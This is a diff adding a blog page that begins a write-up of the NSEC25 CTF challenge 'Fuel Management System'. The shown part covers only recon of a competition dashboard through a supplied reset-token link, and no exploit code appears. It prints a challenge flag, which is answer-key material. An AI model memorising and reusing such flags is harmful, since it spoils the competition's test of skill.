@@ -1,0 +1,1611 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Bring you offensive spirit to the next level">
+      
+      
+      
+        <link rel="canonical" href="https://s-lck.github.io/HolisticPwning/write-up/NSEC25_Fuel-Management-System/">
+      
+      
+        <link rel="prev" href="../NSEC24_Photographic-Memory-System/">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>NSEC25 : Fuel Management System - Holistic Pwning</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="NSEC25 : Fuel Management System - Holistic Pwning" >
+      
+        <meta  property="og:description"  content="Bring you offensive spirit to the next level" >
+      
+        <meta  property="og:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/write-up/NSEC25_Fuel-Management-System.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://s-lck.github.io/HolisticPwning/write-up/NSEC25_Fuel-Management-System/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="NSEC25 : Fuel Management System - Holistic Pwning" >
+      
+        <meta  name="twitter:description"  content="Bring you offensive spirit to the next level" >
+      
+        <meta  name="twitter:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/write-up/NSEC25_Fuel-Management-System.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#nsec25-fuel-management-system" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Holistic Pwning" class="md-header__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Holistic Pwning
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NSEC25 : Fuel Management System
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Holistic Pwning" class="md-nav__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Holistic Pwning
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Holistic Pwning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Binary exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Binary exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/0-architecture-x86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Architecture et debugger
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/1-stack-overflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Stack Overflow
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/2-seh-overflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SEH Overflow
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../binary-exploitation/3-egghunters/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Egg Hunters
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Write up
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Write up
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NSEC24_Photographic-Memory-System/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NSEC24 : Photographic Memory System
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    NSEC25 : Fuel Management System
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    NSEC25 : Fuel Management System
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Intro
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#infinite-holes-of-rabbit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Infinite holes of rabbit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Infinite holes of rabbit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      #1
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      #2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      #3
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      #4
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uuid-is-the-answer" class="md-nav__link">
+    <span class="md-ellipsis">
+      UUID is the answer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce-on-the-sensor" class="md-nav__link">
+    <span class="md-ellipsis">
+      RCE on the sensor
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#i-want-a-new-device" class="md-nav__link">
+    <span class="md-ellipsis">
+      I want a new device
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#where-is-my-license" class="md-nav__link">
+    <span class="md-ellipsis">
+      Where is my license
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kpi-kpi-kpi" class="md-nav__link">
+    <span class="md-ellipsis">
+      KPI KPI KPI
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#intro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Intro
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#infinite-holes-of-rabbit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Infinite holes of rabbit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Infinite holes of rabbit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      #1
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      #2
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      #3
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      #4
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uuid-is-the-answer" class="md-nav__link">
+    <span class="md-ellipsis">
+      UUID is the answer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce-on-the-sensor" class="md-nav__link">
+    <span class="md-ellipsis">
+      RCE on the sensor
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#i-want-a-new-device" class="md-nav__link">
+    <span class="md-ellipsis">
+      I want a new device
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#where-is-my-license" class="md-nav__link">
+    <span class="md-ellipsis">
+      Where is my license
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kpi-kpi-kpi" class="md-nav__link">
+    <span class="md-ellipsis">
+      KPI KPI KPI
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="nsec25-fuel-management-system">NSEC25 : Fuel Management System</h1>
+<p>During the <a href="https://nsec.io/competition/">NSEC25 CTF</a> I had the opportunity to solve the following challenge with the help of my colleague <a href="https://www.linkedin.com/in/ash-ay/">Ashiahanim Ayassor</a>. I will detail all the steps of this challenge in this blog post.</p>
+<h2 id="intro">Intro</h2>
+<p>The following information was given during the CTF:</p>
+<p><img alt="Initial post of the challenge" src="../res/nsec25/message-initial.png" /></p>
+<p>In summary we got this information:</p>
+<ul>
+<li>URL: <a href="https://dashboard.fms.ctf/account/change-password?token=14e355e1-f216-11ef-b19a-d0c637f44704">https://dashboard.fms.ctf/account/change-password?token=14e355e1-f216-11ef-b19a-d0c637f44704</a></li>
+<li>User account: <code>demo@fms.ctf</code></li>
+</ul>
+<h2 id="recon">Recon</h2>
+<p>Using the URL, we arrived on this web page asking us for a password:</p>
+<p><img alt="First page" src="../res/nsec25/url-fournie.png" /></p>
+<p>We choose to set up the password as <code>test</code>:</p>
+<p><img alt="Password reset" src="../res/nsec25/set-password.png" /></p>
+<p>And then we tried to authenticate with the <code>demo</code> user which was given previously and its new password <code>test</code>:</p>
+<p><img alt="Authenticate with the demo user" src="../res/nsec25/auth-user-demo.png" /></p>
+<p>Once authenticated, we had access to this initial dashboard:</p>
+<p><img alt="The dashboard" src="../res/nsec25/dashboard.png" /></p>
+<p>The devices tab gave us this information, where one device seems to be activated and the other is not:</p>
+<p><img alt="The devices" src="../res/nsec25/devices.png" /></p>
+<p>If you try to activate it, you got an error. So for now we are not able to active it.</p>
+<p>There is also a licenses tab, where only one license is valid and two are expired:</p>
+<p><img alt="The licenses" src="../res/nsec25/licenses.png" /></p>
+<p>The users tab informed us that there are only two accounts, and both of them are enabled:</p>
+<p><img alt="The users" src="../res/nsec25/users.png" /></p>
+<p>And finally the documentation tab, where we found some information regarding the sensor:</p>
+<p><img alt="Documentation" src="../res/nsec25/documentation.png" /></p>
+<p>We also found our first flag at the bottom of the page:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">$</span> <span class="p">/</span><span class="n">snap</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">askgod</span> <span class="n">submit</span> <span class="n">FLAG-ca16cce6ad9a7f5eac1f6c949f34f86e66fbcc07</span>                        
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span> <span class="n">score</span> <span class="n">your</span> <span class="n">team</span> <span class="n">1</span> <span class="n">points</span><span class="p">!</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">Message</span><span class="p">:</span> <span class="n">Sometimes</span><span class="p">,</span> <span class="n">you</span> <span class="n">need</span> <span class="n">to</span> <span class="n">RTFM</span> <span class="n">1</span><span class="p">/</span><span class="n">6</span>
+</code></pre></div>
+<p>We got a first hint on the CTF board:</p>
+<p><img alt="First hint" src="../res/nsec25/first-hint.png" /></p>
